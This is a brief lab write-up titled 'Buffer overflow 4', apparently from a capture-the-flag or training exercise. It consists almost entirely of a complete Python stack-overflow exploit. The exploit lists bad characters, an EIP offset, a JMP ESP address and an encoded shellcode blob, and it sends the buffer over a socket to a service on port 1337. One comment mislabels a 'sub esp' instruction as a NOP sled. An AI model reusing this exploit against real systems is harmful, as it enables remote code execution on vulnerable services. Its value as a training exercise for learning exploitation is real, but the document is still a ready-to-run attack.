# Buffer overflow 4

Badchars: `\x00\xa9\xcd\xd4`

## Exploit code

```python
#!/usr/bin/env python3
import socket


ip = "MACHINE_IP"
port = 1337

buf_length = 2500
prefix = "OVERFLOW4 "
offset = 2026                           # EIP offset
overflow = "A" * offset
jmp_esp = "\xc7\x11\x50\x62"

buffer = ""
buffer += prefix
buffer += overflow                      # Padding
buffer += jmp_esp                       # Overwriting saved return pointer
buffer += "\x83\xec\x10"                # NOP sled
buffer +=("\xb8\x76\x3e\x18\x5d\xd9\xce\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
	"\x52\x31\x46\x12\x03\x46\x12\x83\xb0\x3a\xfa\xa8\xc0\xab\x78"
	"\x52\x38\x2c\x1d\xda\xdd\x1d\x1d\xb8\x96\x0e\xad\xca\xfa\xa2"
	"\x46\x9e\xee\x31\x2a\x37\x01\xf1\x81\x61\x2c\x02\xb9\x52\x2f"
	"\x80\xc0\x86\x8f\xb9\x0a\xdb\xce\xfe\x77\x16\x82\x57\xf3\x85"
	"\x32\xd3\x49\x16\xb9\xaf\x5c\x1e\x5e\x67\x5e\x0f\xf1\xf3\x39"
	"\x8f\xf0\xd0\x31\x86\xea\x35\x7f\x50\x81\x8e\x0b\x63\x43\xdf"
	"\xf4\xc8\xaa\xef\x06\x10\xeb\xc8\xf8\x67\x05\x2b\x84\x7f\xd2"
	"\x51\x52\xf5\xc0\xf2\x11\xad\x2c\x02\xf5\x28\xa7\x08\xb2\x3f"
	"\xef\x0c\x45\x93\x84\x29\xce\x12\x4a\xb8\x94\x30\x4e\xe0\x4f"
	"\x58\xd7\x4c\x21\x65\x07\x2f\x9e\xc3\x4c\xc2\xcb\x79\x0f\x8b"
	"\x38\xb0\xaf\x4b\x57\xc3\xdc\x79\xf8\x7f\x4a\x32\x71\xa6\x8d"
	"\x35\xa8\x1e\x01\xc8\x53\x5f\x08\x0f\x07\x0f\x22\xa6\x28\xc4"
	"\xb2\x47\xfd\x4b\xe2\xe7\xae\x2b\x52\x48\x1f\xc4\xb8\x47\x40"
	"\xf4\xc3\x8d\xe9\x9f\x3e\x46\xd6\xc8\x30\x16\xbe\x0a\xb0\x17"
	"\x84\x82\x56\x7d\xea\xc2\xc1\xea\x93\x4e\x99\x8b\x5c\x45\xe4"
	"\x8c\xd7\x6a\x19\x42\x10\x06\x09\x33\xd0\x5d\x73\x92\xef\x4b"
	"\x1b\x78\x7d\x10\xdb\xf7\x9e\x8f\x8c\x50\x50\xc6\x58\x4d\xcb"
	"\x70\x7e\x8c\x8d\xbb\x3a\x4b\x6e\x45\xc3\x1e\xca\x61\xd3\xe6"
	"\xd3\x2d\x87\xb6\x85\xfb\x71\x71\x7c\x4a\x2b\x2b\xd3\x04\xbb"
	"\xaa\x1f\x97\xbd\xb2\x75\x61\x21\x02\x20\x34\x5e\xab\xa4\xb0"
	"\x27\xd1\x54\x3e\xf2\x51\x74\xdd\xd6\xaf\x1d\x78\xb3\x0d\x40"
	"\x7b\x6e\x51\x7d\xf8\x9a\x2a\x7a\xe0\xef\x2f\xc6\xa6\x1c\x42"
	"\x57\x43\x22\xf1\x58\x46")
buffer += "D" * (buf_length - (len(buffer) - len(prefix)))      # Trail padding
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
    s.send(bytes(buffer, "latin-1"))
    print("[+] Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```

